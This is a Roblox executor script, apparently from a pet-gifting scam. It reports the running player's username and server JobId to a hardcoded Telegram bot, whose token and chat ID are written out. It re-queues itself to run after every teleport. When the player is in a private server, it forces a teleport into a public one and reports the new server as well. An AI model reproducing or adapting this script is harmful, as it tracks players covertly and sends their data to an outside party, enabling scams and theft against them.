warn("[PETGIFT] Script started with Telegram logging")

local DEBUG_TAG = "[PETGIFT]"
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer

local PLACE_ID = 126884695634066 -- Same place ID

-- Telegram configuration
local TELEGRAM_URL = "https://api.telegram.org/bot8446879035:AAH1DGTI_M8FAX0y0RNVv8q1k1MsOhMj6e4/sendMessage"
local TELEGRAM_CHAT_ID = "2001061743"

-- Executor request function
local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request

local function debugPrint(...)
	print(DEBUG_TAG, ...)
end

local function sendTelegramLog(reason)
	if not requestFunc then
		warn(DEBUG_TAG, "No request function available.")
		return
	end

	local jobId = game.JobId
	local username = LocalPlayer.Name

	local message = string.format(
		"üêæ PetGifting Log\n\nReason: %s\nUsername: %s\nJobId: %s",
		reason,
		username,
		jobId
	)

	local payload = {
		Url = TELEGRAM_URL,
		Method = "POST",
		Headers = {["Content-Type"] = "application/json"},
		Body = HttpService:JSONEncode({
			chat_id = TELEGRAM_CHAT_ID,
			text = message
		})
	}

	pcall(function() requestFunc(payload) end)
end

-- Queue this script to run after teleport
if syn then
	syn.queue_on_teleport(script.Source)
elseif queue_on_teleport then
	queue_on_teleport(script.Source)
end

-- Send JobId immediately on script start
sendTelegramLog(Players.PrivateServerId and "Started in private server" or "Started in public server")

-- Only hop if in a private server
if Players.PrivateServerId then
	debugPrint("Private server detected. Hopping...")
	TeleportService:Teleport(PLACE_ID, LocalPlayer)
else
	debugPrint("Public server detected. No hop will be done.")
end

-- Send JobId after teleport
Players.PlayerAdded:Connect(function(plr)
	if plr == LocalPlayer then
		debugPrint("Player joined after hop, sending JobId")
		sendTelegramLog("Joined new server after hop")
	end
end)
